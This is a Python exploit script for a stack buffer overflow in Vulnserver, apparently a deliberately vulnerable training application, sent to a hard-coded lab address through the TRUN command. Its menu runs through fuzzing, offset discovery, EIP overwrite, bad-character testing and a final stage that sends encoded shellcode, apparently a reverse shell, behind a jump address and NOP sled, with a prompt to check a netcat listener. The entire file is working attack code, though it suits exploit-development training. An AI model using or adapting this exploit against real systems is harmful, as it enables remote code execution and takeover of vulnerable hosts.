#!/usr/bin/python3
import sys
import socket
from time import sleep


def border():
    print("-" * 100)


def server_error():
    print("Error connecting to server")
    border()
    sys.exit()


def try_fuzzing(target_ip, target_port, cmd_attacking):
    buffer = "A" * 100
    print(f"Starting to fuzz target {target_ip} on port {target_port}")
    print("You may need to CTRL+C the script once you've noticed the server has crashed.")
    border()
    while True:
        try:
            print(f'Trying buffer size of {str(len(buffer))} bytes')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            payload = (cmd_attacking + buffer)
            s.send((payload.encode()))
            s.close()
            sleep(1)
            buffer += "A" * 100
        except:
            print(f"Fuzzing crashed at {str(len(buffer))} bytes")
            border()
            sys.exit()


def try_offset(target_ip, target_port, cmd_attacking):
    offset = str(input("Enter the offset: "))
    border()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        payload = cmd_attacking + offset
        s.send(payload.encode())
        print("\nPayload sent. Grab the new EIP value.\n")
        s.close()
        border()
    except:
        server_error()


def try_overwrite_eip(target_ip, target_port, cmd_attacking):
    offset = int(input("Enter the exact offset value: "))
    shellcode = "A" * offset + "B" * 4

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        payload = cmd_attacking + shellcode
        s.send(payload.encode())
        print(f"\nPayload sent with a offset of {offset} bytes. \nExpected EIP value should be 42424242.\n")
        s.close()
        border()
    except:
        server_error()


def try_bad_chars(target_ip, target_port, cmd_attacking):
    bad_chars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )

    offset = int(input("Enter exact offset value: "))
    shellcode = "A" * offset + "B" * 4 + bad_chars

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        payload = cmd_attacking + shellcode
        s.send(payload.encode())
        print("\nPayload sent. \nLook in the Hex Dump of the ESP to find bad characters.")
        s.close()
        border()
    except:
        server_error()


def try_reverse_shell(target_ip, target_port, cmd_attacking):
    overflow = (
        b"\xdd\xc5\xd9\x74\x24\xf4\x58\xbe\x6c\xac\xc6\xcc\x31\xc9"
        b"\xb1\x52\x31\x70\x17\x03\x70\x17\x83\x84\x50\x24\x39\xa8"
        b"\x41\x2b\xc2\x50\x92\x4c\x4a\xb5\xa3\x4c\x28\xbe\x94\x7c"
        b"\x3a\x92\x18\xf6\x6e\x06\xaa\x7a\xa7\x29\x1b\x30\x91\x04"
        b"\x9c\x69\xe1\x07\x1e\x70\x36\xe7\x1f\xbb\x4b\xe6\x58\xa6"
        b"\xa6\xba\x31\xac\x15\x2a\x35\xf8\xa5\xc1\x05\xec\xad\x36"
        b"\xdd\x0f\x9f\xe9\x55\x56\x3f\x08\xb9\xe2\x76\x12\xde\xcf"
        b"\xc1\xa9\x14\xbb\xd3\x7b\x65\x44\x7f\x42\x49\xb7\x81\x83"
        b"\x6e\x28\xf4\xfd\x8c\xd5\x0f\x3a\xee\x01\x85\xd8\x48\xc1"
        b"\x3d\x04\x68\x06\xdb\xcf\x66\xe3\xaf\x97\x6a\xf2\x7c\xac"
        b"\x97\x7f\x83\x62\x1e\x3b\xa0\xa6\x7a\x9f\xc9\xff\x26\x4e"
        b"\xf5\x1f\x89\x2f\x53\x54\x24\x3b\xee\x37\x21\x88\xc3\xc7"
        b"\xb1\x86\x54\xb4\x83\x09\xcf\x52\xa8\xc2\xc9\xa5\xcf\xf8"
        b"\xae\x39\x2e\x03\xcf\x10\xf5\x57\x9f\x0a\xdc\xd7\x74\xca"
        b"\xe1\x0d\xda\x9a\x4d\xfe\x9b\x4a\x2e\xae\x73\x80\xa1\x91"
        b"\x64\xab\x6b\xba\x0f\x56\xfc\x05\x67\x61\xfa\xed\x7a\x91"
        b"\x1d\x7e\xf3\x77\x4b\x6e\x52\x20\xe4\x17\xff\xba\x95\xd8"
        b"\xd5\xc7\x96\x53\xda\x38\x58\x94\x97\x2a\x0d\x54\xe2\x10"
        b"\x98\x6b\xd8\x3c\x46\xf9\x87\xbc\x01\xe2\x1f\xeb\x46\xd4"
        b"\x69\x79\x7b\x4f\xc0\x9f\x86\x09\x2b\x1b\x5d\xea\xb2\xa2"
        b"\x10\x56\x91\xb4\xec\x57\x9d\xe0\xa0\x01\x4b\x5e\x07\xf8"
        b"\x3d\x08\xd1\x57\x94\xdc\xa4\x9b\x27\x9a\xa8\xf1\xd1\x42"
        b"\x18\xac\xa7\x7d\x95\x38\x20\x06\xcb\xd8\xcf\xdd\x4f\xf8"
        b"\x2d\xf7\xa5\x91\xeb\x92\x07\xfc\x0b\x49\x4b\xf9\x8f\x7b"
        b"\x34\xfe\x90\x0e\x31\xba\x16\xe3\x4b\xd3\xf2\x03\xff\xd4"
        b"\xd6"
    )

    # example for address 0x625011af == "\xaf\x11\x50\x62"
    shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 90 + overflow

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        payload = bytes(cmd_attacking, encoding='utf-8') + shellcode
        s.send(payload)
        s.close()
        print("\nPayload sent, look at your netcat listening port.\nYou should hopefully have root access.\n")
        border()
    except:
        server_error()


def main():
    target_ip = "192.168.57.13"
    target_port = 9999
    cmd_attacking = 'TRUN /.:/'
    # target_ip = str(input('Enter victim ip: '))
    # target_port = int(input('Enter victim port: '))
    # cmd_attacking = str(input('Enter cmd to attack: '))

    border()
    print("\n                      Simple Stack Buffer Overflow for Vulnserver\n")
    border()
    print("Options: \n\n   1. Fuzzing \n   2. Offset \n   3. Overwrite EIP \n   4. Bad Chars \n   5. Reverse Shell \n")
    option = int(input("Enter option: "))
    border()

    if option == 1:
        try_fuzzing(target_ip, target_port, cmd_attacking)
    elif option == 2:
        try_offset(target_ip, target_port, cmd_attacking)
    elif option == 3:
        try_overwrite_eip(target_ip, target_port, cmd_attacking)
    elif option == 4:
        try_bad_chars(target_ip, target_port, cmd_attacking)
    elif option == 5:
        try_reverse_shell(target_ip, target_port, cmd_attacking)


main()
